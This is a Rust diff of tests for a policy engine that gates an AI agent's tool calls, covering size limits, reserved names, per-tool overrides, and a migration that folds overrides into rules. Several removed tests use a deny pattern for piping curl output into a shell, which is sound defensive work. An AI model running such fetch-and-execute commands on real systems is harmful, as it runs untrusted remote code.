+        let huge = "x".repeat(MAX_AUTHORED_STRING + 1);
+        for draft in [
+            json!({ "name": huge }),
+            json!({ "name": "t", "tools": [{ "match": [huge], "action": "allow" }] }),
+            json!({ "name": "t", "tools": [{ "match": ["Bash"], "action": "allow",
+                                            "risk": huge }] }),
+            json!({ "name": "t", "tools": [{ "match": ["Edit"], "action": "allow",
+                                            "paths": { "deny": [huge] } }] }),
+            json!({ "name": "t", "tools": [{ "match": ["Bash"], "action": "allow",
+                                            "shell": { "deny_regex": [huge] } }] }),
+        ] {
+            let err = Policy::parse_strict(draft).expect_err("an oversized string must refuse");
+            assert!(
+                err.contains(&MAX_AUTHORED_STRING.to_string()),
+                "the refusal must name the limit: {err}"
+            );
+        }
+    }
+
+    /// Bounds are an AUTHORING boundary only. A stored blob that exceeds one
+    /// (authored before the bound existed, or by an older build) must keep
+    /// deserializing and governing — stranding a live policy would be a much
+    /// worse failure than the oversized document.
+    #[test]
+    fn bounds_do_not_apply_to_stored_blobs() {
+        let stored = json!({
+            "name": "t",
+            "tools": (0..MAX_RULES + 10)
+                .map(|n| json!({ "match": [format!("T{n}")], "action": "allow" }))
+                .collect::<Vec<_>>(),
+        });
+        let p: Policy = serde_json::from_value(stored).expect("stored blobs are not re-bounded");
+        assert_eq!(p.tools.len(), MAX_RULES + 10);
+    }
+
+    /// The reserved list is one const shared by the API and the boot seed;
+    /// both refuse the same names. (The router side is pinned by
+    /// `fluidbox-server`'s `policy_routes_are_all_reserved`.)
+    #[test]
+    fn reserved_policy_names_are_the_static_route_segments() {
+        for name in RESERVED_POLICY_NAMES {
+            assert!(is_reserved_policy_name(name), "{name}");
+        }
+        assert!(!is_reserved_policy_name("default"));
+        assert!(!is_reserved_policy_name("Validate"), "match is exact");
+    }
+
     #[test]
     fn bad_yaml_is_rejected() {
         assert!(Policy::parse_yaml("name: x\ntools:\n  - match: []\n    action: allow").is_err());
@@ -1101,246 +1817,6 @@ tools:
             "name: x\ntools:\n  - match: [Bash]\n    action: allow\n    shell:\n      deny_regex: [\"(\"]"
         )
         .is_err());
-    }
-
-    /// An explicit per-tool decision beats the general rules by construction —
-    /// without reordering anything the user authored.
-    #[test]
-    fn managed_override_precedes_the_general_rules() {
-        let yaml = r#"
-name: t
-defaults: { tool_action: approve }
-tools:
-  - match: ["mcp__*"]
-    action: approve
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        let tool = "mcp__cloudflare__kv_namespaces_list";
-        // Baseline: the wildcard rule asks.
-        assert!(matches!(
-            p.evaluate(&req(tool, json!({})), Autonomy::Supervised)
-                .effective,
-            Verdict::RequireApproval { .. }
-        ));
-        // With an override, it allows — and no rule index is reported, because the
-        // override replaced the rule (its on_autonomous no longer applies).
-        p.managed_overrides.push(ToolOverride {
-            tool: tool.into(),
-            action: RuleAction::Allow,
-        });
-        let out = p.evaluate(&req(tool, json!({})), Autonomy::Supervised);
-        assert_eq!(out.effective, Verdict::Allow);
-        assert_eq!(out.matched_rule, None);
-        // A sibling tool is untouched by the override.
-        assert!(matches!(
-            p.evaluate(
-                &req("mcp__cloudflare__kv_namespace_create", json!({})),
-                Autonomy::Supervised
-            )
-            .effective,
-            Verdict::RequireApproval { .. }
-        ));
-    }
-
-    /// Overrides are exact-name only: a click must never author a blanket rule.
-    #[test]
-    fn managed_override_does_not_wildcard_match() {
-        let yaml = r#"
-name: t
-defaults: { tool_action: approve }
-tools:
-  - match: ["mcp__*"]
-    action: approve
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "mcp__*".into(),
-            action: RuleAction::Allow,
-        });
-        // The literal string "mcp__*" is not a matcher — a real tool must not hit it.
-        assert!(matches!(
-            p.evaluate(
-                &req("mcp__cloudflare__kv_namespaces_list", json!({})),
-                Autonomy::Supervised
-            )
-            .effective,
-            Verdict::RequireApproval { .. }
-        ));
-    }
-
-    /// Policies stored before this column existed must deserialize unchanged.
-    #[test]
-    fn managed_overrides_defaults_to_empty_for_existing_policies() {
-        let yaml = "name: t\ntools: []\n";
-        let p = Policy::parse_yaml(yaml).expect("parses");
-        assert!(p.managed_overrides.is_empty());
-    }
-
-    /// An override REPLACES the rule, so the replaced rule's `on_autonomous`
-    /// must not survive it: the autonomy fallback resolves to the policy
-    /// default. This is what `matched_rule = None` buys — were the override
-    /// branch to report `Some(i)`, this run would silently ALLOW.
-    #[test]
-    fn managed_override_resolves_autonomy_to_the_policy_default_not_the_replaced_rule() {
-        let yaml = r#"
-name: t
-defaults: { tool_action: approve }
-autonomy: { permitted: true, on_approval_rule: deny }
-tools:
-  - match: ["Bash"]
-    action: approve
-    on_autonomous: allow
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        // Baseline: the rule's own on_autonomous carries an autonomous run.
-        assert_eq!(
-            p.evaluate(&req("Bash", json!({"command": "ls"})), Autonomy::Autonomous)
-                .effective,
-            Verdict::Allow
-        );
-        // The override replaces that rule — so its on_autonomous: allow goes
-        // with it, and the policy default (deny) governs.
-        p.managed_overrides.push(ToolOverride {
-            tool: "Bash".into(),
-            action: RuleAction::Approve,
-        });
-        p.validate()
-            .expect("unconditional rule: the override is valid");
-        let out = p.evaluate(&req("Bash", json!({"command": "ls"})), Autonomy::Autonomous);
-        assert_eq!(out.matched_rule, None);
-        assert!(out.autonomy_rewritten);
-        assert!(
-            matches!(out.effective, Verdict::Deny { .. }),
-            "override must fall back to the policy default (deny), not the replaced rule's \
-             on_autonomous (allow); got {:?}",
-            out.effective
-        );
-    }
-
-    /// The engine — not the write path — keeps the conditional-rule invariant.
-    /// A `shell` constraint committed to a rule AFTER an override was stored
-    /// would otherwise never fire, silently and forever.
-    #[test]
-    fn managed_override_on_a_shell_constrained_rule_is_rejected() {
-        let yaml = r#"
-name: t
-tools:
-  - match: ["Bash"]
-    action: approve
-    shell:
-      deny_regex: ["curl .* \\| sh"]
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "Bash".into(),
-            action: RuleAction::Allow,
-        });
-        let err = p.validate().expect_err("a shell rule cannot be flattened");
-        assert!(err.contains("'Bash'"), "names the tool: {err}");
-        assert!(err.contains(r#"["Bash"]"#), "names the rule: {err}");
-        assert!(err.contains("conditional rule"), "{err}");
-    }
-
-    /// Same invariant, via `paths` — and through a wildcard rule matcher, to
-    /// pin that the check uses the engine's matcher rather than equality.
-    #[test]
-    fn managed_override_on_a_paths_constrained_rule_is_rejected() {
-        let yaml = r#"
-name: t
-tools:
-  - match: ["Edit", "Write*"]
-    action: allow
-    paths:
-      allow: ["/workspace/**"]
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "WriteNotebook".into(),
-            action: RuleAction::Allow,
-        });
-        let err = p.validate().expect_err("a paths rule cannot be flattened");
-        assert!(err.contains("'WriteNotebook'"), "{err}");
-        assert!(err.contains("conditional rule"), "{err}");
-    }
-
-    /// First-match-wins: a conditional rule the engine can NEVER reach for this
-    /// tool (an earlier rule shadows it) must not trip the check. Rejecting
-    /// here would refuse a policy whose override erases nothing.
-    #[test]
-    fn managed_override_ignores_a_conditional_rule_shadowed_by_an_earlier_one() {
-        let yaml = r#"
-name: t
-tools:
-  - match: ["Bash"]
-    action: approve
-  - match: ["Bash"]
-    action: approve
-    shell:
-      deny_regex: ["curl .* \\| sh"]
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "Bash".into(),
-            action: RuleAction::Allow,
-        });
-        // The shell rule is dead for Bash — evaluate_supervised stops at rule 0.
-        p.validate()
-            .expect("only the FIRST matching rule decides conditionality");
-    }
-
-    /// The common, legitimate case must keep working: an override on a rule
-    /// carrying no paths/shell erases no constraint.
-    #[test]
-    fn managed_override_on_an_unconditional_rule_validates() {
-        let yaml = r#"
-name: t
-defaults: { tool_action: approve }
-tools:
-  - match: ["mcp__*"]
-    action: approve
-"#;
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "mcp__cloudflare__kv_namespaces_list".into(),
-            action: RuleAction::Allow,
-        });
-        // A tool no rule matches at all is fine too — nothing to erase.
-        p.managed_overrides.push(ToolOverride {
-            tool: "SomeNewTool".into(),
-            action: RuleAction::Deny,
-        });
-        p.validate().expect("unconditional rules take overrides");
-    }
-
-    /// A wildcard override is permanently-dead config: `evaluate_supervised`
-    /// matches overrides by exact equality, so it could only ever fire for a
-    /// tool literally named `mcp__*`. Refuse it at the door.
-    #[test]
-    fn managed_override_with_a_wildcard_tool_is_rejected() {
-        let mut p = Policy::parse_yaml("name: t\ntools: []\n").expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "mcp__*".into(),
-            action: RuleAction::Allow,
-        });
-        let err = p.validate().expect_err("overrides are exact names only");
-        assert!(err.contains("wildcard"), "{err}");
-    }
-
-    /// Uniqueness is asserted in the design; `.find()` silently resolves
-    /// first-wins, which makes a second entry a lie about what is enforced.
-    #[test]
-    fn duplicate_managed_override_tools_are_rejected() {
-        let mut p = Policy::parse_yaml("name: t\ntools: []\n").expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "Bash".into(),
-            action: RuleAction::Allow,
-        });
-        p.managed_overrides.push(ToolOverride {
-            tool: "Bash".into(),
-            action: RuleAction::Deny,
-        });
-        let err = p.validate().expect_err("one decision per tool");
-        assert!(err.contains("duplicate"), "{err}");
     }
 
     /// The seed policy is the fixture because it exercises every case.
@@ -1454,34 +1930,6 @@ tools:
             Verdict::Allow
         );
     }
-
-    #[test]
-    fn tool_matrix_reports_overrides_over_the_underlying_status() {
-        let yaml = include_str!("../../../policies/default.yaml");
-        let mut p = Policy::parse_yaml(yaml).expect("parses");
-        p.managed_overrides.push(ToolOverride {
-            tool: "mcp__cloudflare__kv_list".into(),
-            action: RuleAction::Allow,
-        });
-        let m: std::collections::HashMap<String, ToolStatus> = p
-            .tool_matrix(&["mcp__cloudflare__kv_list".to_string()])
-            .into_iter()
-            .collect();
-        match &m["mcp__cloudflare__kv_list"] {
-            ToolStatus::Overridden { action, underlying } => {
-                assert_eq!(*action, RuleAction::Allow);
-                // The page shows what clearing the override would restore.
-                assert!(matches!(
-                    **underlying,
-                    ToolStatus::Unconditional {
-                        action: RuleAction::Approve,
-                        ..
-                    }
-                ));
-            }
-            other => panic!("expected Overridden, got {other:?}"),
-        }
-    }
 }
 
 /// Property tests: the security invariants the example-based tests above pin
@@ -1587,22 +2035,32 @@ mod proptests {
             prop::collection::vec(arb_rule(), 0..5),
             arb_action(),
             arb_fallback(),
+            // Randomized so the fold-equivalence property really covers the
+            // POLICY-DEFAULT ttl/scope an override's approval verdict carries
+            // (defaults alone would only ever prove 600s/once).
+            1..3600u64,
+            prop_oneof![Just(ApprovalScope::Once), Just(ApprovalScope::Session)],
         )
-            .prop_map(|(tools, default_action, on_approval_rule)| Policy {
-                name: "prop".into(),
-                defaults: PolicyDefaults {
-                    tool_action: default_action,
+            .prop_map(
+                |(tools, default_action, on_approval_rule, ttl, scope)| Policy {
+                    name: "prop".into(),
+                    defaults: PolicyDefaults {
+                        tool_action: default_action,
+                    },
+                    egress: Egress::default(),
+                    budgets: crate::spec::Budgets::default(),
+                    approvals: ApprovalSettings {
+                        default_ttl_secs: ttl,
+                        scope,
+                        timeout_action: TimeoutAction::Deny,
+                    },
+                    autonomy: AutonomySettings {
+                        permitted: true,
+                        on_approval_rule,
+                    },
+                    tools,
                 },
-                egress: Egress::default(),
-                budgets: crate::spec::Budgets::default(),
-                approvals: ApprovalSettings::default(),
-                autonomy: AutonomySettings {
-                    permitted: true,
-                    on_approval_rule,
-                },
-                tools,
-                managed_overrides: Vec::new(),
-            })
+            )
     }
 
     /// Arbitrary printable inputs in the shapes the gate actually receives.
@@ -1718,6 +2176,168 @@ mod proptests {
             let denied = matches!(out.effective, Verdict::Deny { .. });
             prop_assert!(denied);
             prop_assert_eq!(out.matched_rule, Some(0));
+        }
+    }
+
+    // ─── The 0026 override fold, pinned (design §6) ─────────────────────────
+    //
+    // Migration 0026 folds every `managed_overrides` entry into a HEAD rule
+    // (`{match: [tool], action}`), prepended in stored order. The property
+    // below is the fold's correctness proof, WITHIN ITS STATED BOUND (request
+    // tools whose name does not end in `*`; the one divergence outside it has
+    // its own test): for any policy, any stored
+    // override set, and any such request, the PRE-FOLD engine (overrides consulted
+    // first, exact-name, policy-default ttl/scope/autonomy-fallback — mirrored
+    // by `evaluate_with_overrides` because the branch itself is deleted) and
+    // the POST-FOLD engine agree verdict for verdict, in both autonomy modes.
+    // The SQL in 0026 is the mechanism; this test is the guarantee.
+
+    /// Stored override sets. Unique per tool (`.find()` made a second entry a
+    /// lie), but `*`-BEARING TOOLS ARE INCLUDED on purpose: the retired `validate()`
+    /// refused them at the API, yet the fold must be correct for whatever is
+    /// actually in the column, and "the write path enforced it" is not a
+    /// property a migration gets to assume.
+    fn arb_overrides() -> impl Strategy<Value = Vec<(String, RuleAction)>> {
+        let tool = prop_oneof![
+            9 => arb_tool(),
+            // The shapes a `*`-bearing entry could have taken. The first
+            // three are wildcards to `tool_matches` and must be DROPPED; the
+            // last is not (only a TRAILING `*` is special), so it must be
+            // KEPT and folded — and the property covers both outcomes.
+            1 => prop_oneof![
+                Just("mcp__*".to_string()),
+                Just("*".to_string()),
+                Just("Read*".to_string()),
+                Just("fo*o".to_string()),
+            ],
+        ];
+        prop::collection::vec((tool, arb_action()), 0..4).prop_map(|v| {
+            let mut seen = std::collections::HashSet::new();
+            v.into_iter()
+                .filter(|(t, _)| seen.insert(t.clone()))
+                .collect()
+        })
+    }
+
+    /// The 0026 fold, mirrored in Rust: overrides become head rules in stored
+    /// order, ahead of the authored rules — except WILDCARD entries, which are
+    /// dropped (0026 drops them with a `raise warning`, and the lenient
+    /// deserializer filters them). Folding one would convert an entry that
+    /// exact-equality matching made unreachable into a live namespace-wide
+    /// rule; the property below is what proves dropping changes no verdict.
+    fn fold_overrides(overrides: &[(String, RuleAction)], p: &Policy) -> Policy {
+        let mut folded = p.clone();
+        let head = overrides
+            .iter()
+            .filter(|(tool, _)| !tool.ends_with('*'))
+            .map(|(tool, action)| ToolRule {
+                r#match: vec![tool.clone()],
+                action: *action,
+                risk: None,
+                paths: None,
+                shell: None,
+                on_autonomous: None,
+                approval_ttl_secs: None,
+                approval_scope: None,
+            });
+        folded.tools = head.chain(p.tools.iter().cloned()).collect();
+        folded
+    }
+
+    /// The PRE-FOLD engine, mirrored: an exact-name override wins over the
+    /// rules with the POLICY's default ttl/scope, and — because the override
+    /// replaced the rule (`matched_rule = None`) — the POLICY's autonomy
+    /// fallback, never a rule's `on_autonomous`.
+    fn evaluate_with_overrides(
+        p: &Policy,
+        overrides: &[(String, RuleAction)],
+        req: &ToolCallRequest,
+        autonomy: Autonomy,
+    ) -> Verdict {
+        let Some((_, action)) = overrides.iter().find(|(t, _)| *t == req.tool) else {
+            return p.evaluate(req, autonomy).effective;
+        };
+        let original = match action {
+            RuleAction::Allow => Verdict::Allow,
+            RuleAction::Deny => Verdict::Deny {
+                reason: "denied by policy".into(),
+            },
+            RuleAction::Approve => Verdict::RequireApproval {
+                risk: None,
+                ttl_secs: p.approvals.default_ttl_secs,
+                scope: p.approvals.scope,
+                scope_key: req.tool.clone(),
+            },
+        };
+        if autonomy == Autonomy::Autonomous {
+            if let Verdict::RequireApproval { .. } = original {
+                return match p.autonomy.on_approval_rule {
+                    AutonomousFallback::Allow => Verdict::Allow,
+                    AutonomousFallback::Deny => Verdict::Deny {
+                        reason:
+                            "requires human approval; run is autonomous (policy fallback: deny)"
+                                .into(),
+                    },
+                };
+            }
+        }
+        original
+    }
+
+    proptest! {
+        #[test]
+        fn override_fold_preserves_every_verdict(
+            p in arb_policy(),
+            ov in arb_overrides(),
+            free_tool in arb_tool(),
+            pick: prop::sample::Index,
+            hit_override in prop::bool::ANY,
+            input in arb_input(),
+            autonomous in prop::bool::ANY,
+        ) {
+            // Half the requests target an override's exact tool so the folded
+            // head rules are actually exercised, not just walked past.
+            //
+            // Only entries that SURVIVE the fold are eligible targets, and
+            // that bound is the exact scope of this property: the folds agree
+            // for every tool whose name does not END IN `*`. They provably do
+            // NOT agree for one that does — see
+            // `a_wildcard_override_diverges_only_for_star_suffixed_tool_names`,
+            // which pins that divergence with an input where it WIDENS. This
+            // filter is therefore a stated precondition, not a convenience;
+            // removing it would make the property false, not merely noisy.
+            let targets: Vec<&String> =
+                ov.iter().map(|(t, _)| t).filter(|t| !t.ends_with('*')).collect();
+            let tool = if hit_override && !targets.is_empty() {
+                targets[pick.index(targets.len())].clone()
+            } else {
+                free_tool
+            };
+            let autonomy = if autonomous { Autonomy::Autonomous } else { Autonomy::Supervised };
+            let pre = evaluate_with_overrides(&p, &ov, &req(tool.clone(), input.clone()), autonomy);
+            let folded = fold_overrides(&ov, &p);
+            let post = folded
+                .evaluate(&req(tool.clone(), input.clone()), autonomy)
+                .effective;
+            prop_assert_eq!(&pre, &post);
+
+            // Third leg: the LENIENT DESERIALIZER applies the identical fold.
+            // A pre-0026 blob (policy + managed_overrides key) deserializes to
+            // exactly the folded document — this is what keeps an in-flight
+            // run's frozen snapshot governing with the semantics it froze.
+            let mut legacy = serde_json::to_value(&p).unwrap();
+            legacy["managed_overrides"] = serde_json::Value::Array(
+                ov.iter()
+                    .map(|(tool, action)| {
+                        serde_json::json!({ "tool": tool, "action": action })
+                    })
+                    .collect(),
+            );
+            let deserialized: Policy = serde_json::from_value(legacy).unwrap();
+            prop_assert_eq!(
+                serde_json::to_value(&deserialized).unwrap(),
+                serde_json::to_value(&folded).unwrap()
+            );
         }
     }
 }
